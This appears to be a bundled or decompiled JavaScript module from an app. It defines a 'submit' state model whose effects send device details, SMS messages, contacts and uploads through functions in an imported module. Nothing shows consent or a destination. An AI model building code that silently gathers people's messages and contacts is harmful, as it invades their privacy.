var module777 = (function (t, u) {
  if (!u && t && t.__esModule) return t;
  if (null === t || ('object' != typeof t && 'function' != typeof t))
    return {
      default: t,
    };
  var o = n(u);
  if (o && o.has(t)) return o.get(t);
  var c = {},
    l = Object.defineProperty && Object.getOwnPropertyDescriptor;

  for (var f in t)
    if ('default' !== f && Object.prototype.hasOwnProperty.call(t, f)) {
      var p = l ? Object.getOwnPropertyDescriptor(t, f) : null;
      if (p && (p.get || p.set)) Object.defineProperty(c, f, p);
      else c[f] = t[f];
    }

  c.default = t;
  if (o) o.set(t, c);
  return c;
})(require('./777'));

function n(t) {
  if ('function' != typeof WeakMap) return null;
  var u = new WeakMap(),
    o = new WeakMap();
  return (n = function (t) {
    return t ? o : u;
  })(t);
}

var u = {
  namespace: 'submit',
  state: {},
  effects: {
    device: function (n, u) {
      var o = n.payload,
        c = u.call;
      return (function* () {
        return yield c(module777.submit_device, o);
      })();
    },
    sms: function (n, u) {
      var o = n.payload,
        c = u.call;
      return (function* () {
        return yield c(module777.submit_sms, o);
      })();
    },
    contacts: function (n, u) {
      var o = n.payload,
        c = u.call;
      return (function* () {
        return yield c(module777.submit_contacts, o);
      })();
    },
    upload: function (n, u) {
      var o = n.payload,
        c = u.call;
      return (function* () {
        return yield c(module777.upload, o);
      })();
    },
  },
};
exports.default = u;
